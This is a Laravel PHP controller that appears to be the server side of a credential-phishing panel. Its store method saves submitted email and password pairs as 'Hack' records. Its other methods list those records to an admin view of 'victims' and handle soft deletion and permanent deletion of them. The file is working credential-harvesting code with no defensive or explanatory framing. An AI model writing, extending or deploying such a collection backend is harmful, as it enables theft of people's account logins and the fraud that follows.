<?php

namespace App\Http\Controllers;

use App\Models\Hack;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Validator;

class HackController extends Controller
{
    /**
     * Display a listing of the resource.
     */
    public function index()
    {
        $victims = Hack::withoutTrashed()->get();
        return view('admin.victims', compact('victims'));
    }
    public function Del_victims()
    {
        $victims = Hack::onlyTrashed()->get();
        return view('admin.delete', compact('victims'));
    }
    /**
     * Show the form for creating a new resource.
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     */
    public function store(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'email' => 'required|max:255|email',
            'password' => 'required'
        ]);

        if ($validator->fails()) {
            return response()->json([
                'msg' => 'error',
                'data' => $validator->errors(),
            ]);
        }




        if (Hack::create($request->all())) {
            return response()->json([
                'msg' => 'success',

            ]);
        }
    }

    /**
     * Display the specified resource.
     */
    public function show(Hack $hack)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     */
    public function edit(Hack $hack)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     */
    public function update(Request $request, Hack $hack)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     */
    public function destroy($id)
    {


        if ($victim = Hack::find($id)) {
            $victim->delete();
        } elseif ($victim = Hack::withTrashed()->where('id', $id)->first()) {
            $victim->forceDelete();
        }
        return response()->json([
            'msg' => 'success',
            'id' => $id
        ]);
    }
}
